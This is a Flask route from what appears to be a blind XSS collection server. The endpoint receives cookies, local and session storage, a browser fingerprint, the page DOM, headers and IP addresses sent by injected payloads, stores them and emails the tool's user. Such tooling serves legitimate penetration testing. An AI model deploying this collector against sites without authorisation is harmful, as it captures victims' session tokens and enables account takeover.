import json
import time

from app import db
from app.api import bp
from app.models import XSS, Client, Settings
from app.utils import send_mail
from flask import jsonify, request
from flask_cors import cross_origin


@bp.route("/x/<flavor>/<uid>", methods=["GET", "POST"])
@cross_origin()
def catch_xss(flavor, uid):
    """Catches an XSS"""
    client = Client.query.filter_by(uid=uid).first()
    parameters = None

    if client == None:
        return jsonify({"status": "OK"}), 200

    if flavor == "r":
        xss_type = "reflected"
    else:
        xss_type = "stored"
    if "X-Forwarded-For" in request.headers:
        ip_addr = request.headers["X-Forwarded-For"].split(", ")[0]
    else:
        ip_addr = request.remote_addr

    if request.method == "GET":
        parameters = request.args.to_dict()
    elif request.method == "POST":
        if request.is_json:
            parameters = request.get_json()
        else:
            parameters = request.form

    headers = []
    for header in request.headers:
        headers.append({header[0]: header[1]})

    data = {}

    for param, value in parameters.items():

        if param == "cookies":
            if value != "":
                if "cookies" not in data.keys():
                    data["cookies"] = []
                cookies_list = value.split("; ")
                for cookie in cookies_list:
                    cookie_array = cookie.split("=")
                    cookie_name = cookie_array[0]
                    cookie_value = "".join(cookie_array[1:])
                    data["cookies"].append({cookie_name: cookie_value})

        elif param == "local_storage":
            if value != "" and value != "{}":
                if "local_storage" not in data.keys():
                    data["local_storage"] = []
                local_storage = json.loads(value)
                for element in local_storage.items():
                    data["local_storage"].append({element[0]: element[1]})

        elif param == "session_storage":
            if value != "" and value != "{}":
                if "session_storage" not in data.keys():
                    data["session_storage"] = []
                session_storage = json.loads(value)
                for element in session_storage.items():
                    data["session_storage"].append({element[0]: element[1]})
        else:
            if value != "" and value != "{}":
                if param == "fingerprint":
                    data["fingerprint"] = json.loads(value)
                if param == "dom":
                    data["dom"] = "<html>\n{}\n</html>".format(value)
                else:
                    data[param] = value

    xss = XSS(headers=json.dumps(headers), ip_addr=ip_addr, client_id=client.id, xss_type=xss_type, data=json.dumps(data), timestamp=int(time.time()))
    db.session.add(xss)
    db.session.commit()

    settings = Settings.query.first()

    if xss.client.mail_to != None and settings.smtp_host != None:
        try:
            send_mail(xss=xss)
            settings.smtp_status = True
            db.session.commit()
        except:
            settings.smtp_status = False
            db.session.commit()

    return jsonify({"status": "OK"}), 200
